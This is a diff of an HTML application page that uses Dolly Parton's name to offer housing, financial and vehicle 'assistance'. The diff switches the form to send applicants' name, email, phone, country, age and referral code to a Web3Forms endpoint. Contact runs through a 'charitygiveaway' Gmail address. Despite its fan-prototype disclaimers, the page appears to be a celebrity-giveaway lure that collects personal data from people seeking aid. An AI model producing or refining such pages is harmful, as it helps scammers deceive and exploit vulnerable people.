@@ -1,1 +1,112 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Application — Fan Assistance Prototype</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="css/style.css"></head><body class="inner"><header class="site-header solid"><a class="brand" href="index.html"><span class="brand-script">Dolly</span><span class="brand-word">PARTON</span><small>FAN ASSISTANCE</small></a><nav><a href="index.html">Home</a><a href="index.html#support">Support</a><a class="active" href="apply.html">Apply</a><a href="contact.html">Contact</a></nav><a class="header-mail" href="mailto:dollypartoncharitygiveaway@gmail.com">✉ Contact</a></header><main><section class="form-hero"><div><div class="section-tag gold">APPLICATION</div><h1>Tell us what<br><em>support you need.</em></h1><p>This is a fan-created application prototype. Submitting this form does not create an official application or guarantee any benefit.</p></div></section><section class="form-section"><form id="applicationForm" class="application-form"><div class="form-head"><div><span class="section-tag">YOUR INFORMATION</span><h2>Application details</h2></div><span class="required">* Required</span></div><div class="grid2"><label>Full Name *<input required name="fullName" autocomplete="name"></label><label>Email Address *<input required type="email" name="email" autocomplete="email"></label><label>Phone Number *<input required type="tel" name="phone" autocomplete="tel"></label><label>Country *<input required name="country" autocomplete="country-name"></label><label>Age *<input required type="number" min="18" max="120" name="age"></label><label>How long have you been a fan? <select name="fanSince"><option>Less than 1 year</option><option>1–5 years</option><option>6–10 years</option><option>More than 10 years</option></select></label></div><label>Invitation / Referral Code (optional)<input name="referralCode"></label><fieldset><legend>What support do you need most? *</legend><div class="choice-grid"><label><input type="radio" name="support" value="Housing & Living Assistance" required><span>⌂<b>Housing &amp; Living</b></span></label><label><input type="radio" name="support" value="Financial Support"><span>$<b>Financial Support</b></span></label><label><input type="radio" name="support" value="Vehicle Assistance"><span>◇<b>Vehicle Assistance</b></span></label></div></fieldset><label>Why are you applying? *<textarea required name="message" rows="6" placeholder="Briefly explain the support you are seeking."></textarea></label><label class="check"><input required type="checkbox" name="agreement"> <span>I understand that this is a fan-created prototype and that submitting this form does not guarantee assistance.</span></label><button class="btn btn-navy full" type="submit">Submit Application <span>→</span></button><div id="formMessage" class="form-message" hidden></div><p class="form-safety">For your safety, never enter passwords, bank PINs, full card numbers or online-banking credentials.</p></form></section></main><footer><div class="footer-brand"><span class="brand-script">Dolly</span><b>PARTON</b><small>FAN ASSISTANCE PROTOTYPE</small></div><div><h4>Navigate</h4><a href="index.html">Home</a><a href="contact.html">Contact</a></div><div><h4>Contact</h4><a href="mailto:dollypartoncharitygiveaway@gmail.com">dollypartoncharitygiveaway@gmail.com</a></div><div><h4>Notice</h4><p>Fan-created concept. Not affiliated with or endorsed by Dolly Parton or her representatives.</p></div></footer><div class="copyright">© 2026 Fan Assistance Prototype</div><script src="js/app.js"></script></body></html>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Application — Fan Assistance Prototype</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="inner">
+  <header class="site-header solid">
+    <a class="brand" href="index.html">
+      <span class="brand-script">Dolly</span>
+      <span class="brand-word">PARTON</span>
+      <small>FAN ASSISTANCE</small>
+    </a>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="index.html#support">Support</a>
+      <a class="active" href="apply.html">Apply</a>
+      <a href="contact.html">Contact</a>
+    </nav>
+    <a class="header-mail" href="mailto:dollypartoncharitygiveaway@gmail.com">✉ Contact</a>
+  </header>
+
+  <main>
+    <section class="form-hero">
+      <div>
+        <div class="section-tag gold">APPLICATION</div>
+        <h1>Tell us what<br><em>support you need.</em></h1>
+        <p>This is a fan-created application prototype. Submitting this form does not create an official application or guarantee any benefit.</p>
+      </div>
+    </section>
+
+    <section class="form-section">
+      <!-- WORKING WEB3FORMS SETUP -->
+      <form action="https://api.web3forms.com/submit" method="POST" class="application-form">
+        <input type="hidden" name="access_key" value="154c9c7c-ce5f-439b-86a6-80a56e9d7e9c">
+
+        <div class="form-head">
+          <div><span class="section-tag">YOUR INFORMATION</span><h2>Application details</h2></div>
+          <span class="required">* Required</span>
+        </div>
+
+        <div class="grid2">
+          <label>Full Name *<input required name="fullName" autocomplete="name"></label>
+          <label>Email Address *<input required type="email" name="email" autocomplete="email"></label>
+          <label>Phone Number *<input required type="tel" name="phone" autocomplete="tel"></label>
+          <label>Country *<input required name="country" autocomplete="country-name"></label>
+          <label>Age *<input required type="number" min="18" max="120" name="age"></label>
+          <label>How long have you been a fan? 
+            <select name="fanSince">
+              <option>Less than 1 year</option>
+              <option>1–5 years</option>
+              <option>6–10 years</option>
+              <option>More than 10 years</option>
+            </select>
+          </label>
+        </div>
+
+        <label>Invitation / Referral Code (optional)<input name="referralCode"></label>
+
+        <fieldset>
+          <legend>What support do you need most? *</legend>
+          <div class="choice-grid">
+            <label><input type="radio" name="support" value="Housing & Living Assistance" required><span>⌂<b>Housing &amp; Living</b></span></label>
+            <label><input type="radio" name="support" value="Financial Support"><span>$<b>Financial Support</b></span></label>
+            <label><input type="radio" name="support" value="Vehicle Assistance"><span>◇<b>Vehicle Assistance</b></span></label>
+          </div>
+        </fieldset>
+
+        <label>Why are you applying? *<textarea required name="message" rows="6" placeholder="Briefly explain the support you are seeking."></textarea></label>
+
+        <label class="check">
+          <input required type="checkbox" name="agreement"> 
+          <span>I understand that this is a fan-created prototype and that submitting this form does not guarantee assistance.</span>
+        </label>
+
+        <button class="btn btn-navy full" type="submit">Submit Application <span>→</span></button>
+
+        <p class="form-safety">For your safety, never enter passwords, bank PINs, full card numbers or online-banking credentials.</p>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    <div class="footer-brand">
+      <span class="brand-script">Dolly</span>
+      <b>PARTON</b>
+      <small>FAN ASSISTANCE PROTOTYPE</small>
+    </div>
+    <div>
+      <h4>Navigate</h4>
+      <a href="index.html">Home</a>
+      <a href="contact.html">Contact</a>
+    </div>
+    <div>
+      <h4>Contact</h4>
+      <a href="mailto:dollypartoncharitygiveaway@gmail.com">dollypartoncharitygiveaway@gmail.com</a>
+    </div>
+    <div>
+      <h4>Notice</h4>
+      <p>Fan-created concept. Not affiliated with or endorsed by Dolly Parton or her representatives.</p>
+    </div>
+  </footer>
+
+  <div class="copyright">© 2026 Fan Assistance Prototype</div>
+  <script src="js/app.js"></script>
+</body>
+</html>
